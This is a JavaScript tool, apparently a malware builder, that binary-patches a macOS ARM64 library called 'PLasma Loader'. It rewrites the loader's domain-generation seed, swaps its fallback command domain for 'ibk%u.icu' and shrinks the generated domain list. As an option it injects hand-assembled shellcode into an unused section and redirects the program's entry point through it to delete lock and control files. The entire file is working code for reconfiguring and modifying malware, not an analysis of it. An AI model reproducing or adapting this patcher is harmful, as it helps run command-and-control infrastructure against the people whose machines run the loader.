/**
 * Loader Patcher
 *
 * Patch entry0_type01.dylib (PLasma Loader):
 * - DGA seed (0x8CB56)
 * - Backup 域名 (0x8D979)
 * - Domain count 512→32 (0x82C24)
 * - [可选] clean-before-start shellcode
 */
import { findSection } from './fat-binary.js';
import { arm64_stp_pre, arm64_ldp_post, arm64_movz, arm64_movk, arm64_svc, arm64_b, arm64_b_cond, arm64_cbnz, arm64_tbnz, arm64_subs_imm, arm64_sub_imm, arm64_add_imm, arm64_str_imm, arm64_adr, writeStringAligned, } from './arm64.js';
const SEED_OFFSET = 0x8CB56;
const SEED_LENGTH = 32;
const DOMAIN_COUNT_OFFSET = 0x82C24;
const DEFAULT_DOMAIN_COUNT = 32;
const BACKUP_OFFSET = 0x8D979;
const BACKUP_NEW = 'https://ibk%u.icu';
const STARTX_OFFSET = 0x75680;
export function patchLoader(input, opts) {
    if (opts.seed.length !== SEED_LENGTH) {
        throw new Error(`Seed must be exactly ${SEED_LENGTH} characters (got ${opts.seed.length})`);
    }
    const patched = Buffer.from(input);
    // 1. Patch DGA seed
    for (let i = 0; i < SEED_LENGTH; i++) {
        patched[SEED_OFFSET + i] = opts.seed.charCodeAt(i);
    }
    // 2. Patch backup 域名
    const backupBuf = Buffer.alloc(21, 0);
    backupBuf.write(BACKUP_NEW, 'ascii');
    backupBuf.copy(patched, BACKUP_OFFSET);
    // 3. Patch domain count: MOVZ W1, #512 → MOVZ W1, #32
    const origInstr = patched.readUInt32LE(DOMAIN_COUNT_OFFSET);
    if (origInstr === 0x52804001) {
        const movzInstr = ((0b01010010100 << 21) | (DEFAULT_DOMAIN_COUNT << 5) | 1) >>> 0;
        patched.writeUInt32LE(movzInstr, DOMAIN_COUNT_OFFSET);
    }
    // 4. Clean-before-start (可选)
    if (opts.cleanBeforeStart) {
        patchCleanBeforeStart(patched);
    }
    return patched;
}
function patchCleanBeforeStart(patched) {
    const sect = findSection(patched, '__TEXT', '__gcc_except_tab');
    if (!sect)
        throw new Error('Cannot find __TEXT,__gcc_except_tab section');
    const strings = [
        '/tmp/uninstall',
        '/tmp/pl.sp.exec.guard.lock',
        '/var/tmp/pl.core.lock',
        '/tmp/stop',
        '/tmp/relaunch',
    ];
    let strTableSize = 0;
    const strOffsets = [];
    for (const s of strings) {
        strOffsets.push(strTableSize);
        strTableSize += Math.ceil((s.length + 1) / 4) * 4;
    }
    const instrs = [];
    // 保存寄存器
    instrs.push(arm64_stp_pre(29, 30, 31, -32));
    const stp_off = ((16 / 8) & 0x7F) >>> 0;
    instrs.push(((0b1010100100 << 22) | (stp_off << 15) | (20 << 10) | (31 << 5) | 19) >>> 0);
    instrs.push(arm64_add_imm(29, 31, 0, 1));
    // open("/tmp/uninstall", O_CREAT|O_WRONLY|O_TRUNC, 0644)
    const adr_uninstall_idx = instrs.length;
    instrs.push(0);
    instrs.push(arm64_movz(1, 0x601, 0, 0));
    instrs.push(arm64_movz(2, 0x1A4, 0, 0));
    instrs.push(arm64_movz(16, 5, 0, 1));
    instrs.push(arm64_svc(0x80));
    const tbnz_skip_close_idx = instrs.length;
    instrs.push(0);
    instrs.push(arm64_movz(16, 6, 0, 1));
    instrs.push(arm64_svc(0x80));
    const skip_close_target = instrs.length;
    // 轮询等待锁文件消失
    instrs.push(arm64_movz(19, 20, 0, 0));
    const loop_start_idx = instrs.length;
    const adr_lock1_idx = instrs.length;
    instrs.push(0);
    instrs.push(arm64_movz(1, 0, 0, 0));
    instrs.push(arm64_movz(16, 33, 0, 1));
    instrs.push(arm64_svc(0x80));
    const cbnz_check_lock2_idx = instrs.length;
    instrs.push(0);
    const b_sleep_from_lock1_idx = instrs.length;
    instrs.push(0);
    const check_lock2_target = instrs.length;
    const adr_lock2_idx = instrs.length;
    instrs.push(0);
    instrs.push(arm64_movz(1, 0, 0, 0));
    instrs.push(arm64_movz(16, 33, 0, 1));
    instrs.push(arm64_svc(0x80));
    const cbnz_both_gone_idx = instrs.length;
    instrs.push(0);
    // sleep 500ms
    const sleep_target = instrs.length;
    instrs.push(arm64_sub_imm(31, 31, 16, 1));
    instrs.push(arm64_str_imm(31, 31, 0, 3));
    instrs.push(arm64_movz(20, 0x6500, 0, 1));
    instrs.push(arm64_movk(20, 0x1DCD, 16, 1));
    instrs.push(arm64_str_imm(20, 31, 8, 3));
    instrs.push(arm64_add_imm(0, 31, 0, 1));
    instrs.push(arm64_movz(1, 0, 0, 1));
    instrs.push(arm64_movz(16, 240, 0, 1));
    instrs.push(arm64_svc(0x80));
    instrs.push(arm64_add_imm(31, 31, 16, 1));
    instrs.push(arm64_subs_imm(19, 19, 1, 0));
    const bne_loop_idx = instrs.length;
    instrs.push(0);
    const both_gone_target = instrs.length;
    // unlink 清理文件
    const adr_unlink1_idx = instrs.length;
    instrs.push(0);
    instrs.push(arm64_movz(16, 10, 0, 1));
    instrs.push(arm64_svc(0x80));
    const adr_unlink2_idx = instrs.length;
    instrs.push(0);
    instrs.push(arm64_movz(16, 10, 0, 1));
    instrs.push(arm64_svc(0x80));
    const adr_unlink3_idx = instrs.length;
    instrs.push(0);
    instrs.push(arm64_movz(16, 10, 0, 1));
    instrs.push(arm64_svc(0x80));
    const adr_unlink4_idx = instrs.length;
    instrs.push(0);
    instrs.push(arm64_movz(16, 10, 0, 1));
    instrs.push(arm64_svc(0x80));
    const adr_unlink5_idx = instrs.length;
    instrs.push(0);
    instrs.push(arm64_movz(16, 10, 0, 1));
    instrs.push(arm64_svc(0x80));
    // 恢复寄存器
    const ldp_off = ((16 / 8) & 0x7F) >>> 0;
    instrs.push(((0b1010100101 << 22) | (ldp_off << 15) | (20 << 10) | (31 << 5) | 19) >>> 0);
    instrs.push(arm64_ldp_post(29, 30, 31, 32));
    // 执行原始指令 + 跳回
    const origInstr = patched.readUInt32LE(STARTX_OFFSET);
    instrs.push(origInstr);
    const b_back_idx = instrs.length;
    instrs.push(0);
    const codeSize = instrs.length * 4;
    const totalSize = codeSize + strTableSize;
    if (totalSize > sect.size) {
        throw new Error(`Shellcode too large (${totalSize} bytes) for __gcc_except_tab (${sect.size} bytes)`);
    }
    const injectOffset = sect.offset + sect.size - totalSize;
    const strTableOffset = injectOffset + codeSize;
    // Patch ADR 指令
    function patchAdr(instrIdx, strIdx) {
        const instrFileOff = injectOffset + instrIdx * 4;
        const strFileOff = strTableOffset + strOffsets[strIdx];
        instrs[instrIdx] = arm64_adr(0, strFileOff - instrFileOff);
    }
    patchAdr(adr_uninstall_idx, 0);
    patchAdr(adr_lock1_idx, 1);
    patchAdr(adr_lock2_idx, 2);
    patchAdr(adr_unlink1_idx, 0);
    patchAdr(adr_unlink2_idx, 1);
    patchAdr(adr_unlink3_idx, 2);
    patchAdr(adr_unlink4_idx, 3);
    patchAdr(adr_unlink5_idx, 4);
    // Patch 分支指令
    instrs[tbnz_skip_close_idx] = arm64_tbnz(0, 63, (skip_close_target - tbnz_skip_close_idx) * 4);
    instrs[cbnz_check_lock2_idx] = arm64_cbnz(0, (check_lock2_target - cbnz_check_lock2_idx) * 4, 0);
    instrs[b_sleep_from_lock1_idx] = arm64_b((sleep_target - b_sleep_from_lock1_idx) * 4);
    instrs[cbnz_both_gone_idx] = arm64_cbnz(0, (both_gone_target - cbnz_both_gone_idx) * 4, 0);
    instrs[bne_loop_idx] = arm64_b_cond((loop_start_idx - bne_loop_idx) * 4, 0b0001);
    const b_back_fileOff = injectOffset + b_back_idx * 4;
    instrs[b_back_idx] = arm64_b(STARTX_OFFSET + 4 - b_back_fileOff);
    // 写入 shellcode
    for (let i = 0; i < instrs.length; i++) {
        patched.writeUInt32LE(instrs[i], injectOffset + i * 4);
    }
    // 写入字符串表
    let strWriteOff = strTableOffset;
    for (const s of strings) {
        strWriteOff += writeStringAligned(patched, strWriteOff, s);
    }
    // Patch _startx 入口
    patched.writeUInt32LE(arm64_b(injectOffset - STARTX_OFFSET), STARTX_OFFSET);
}
//# sourceMappingURL=loader.js.map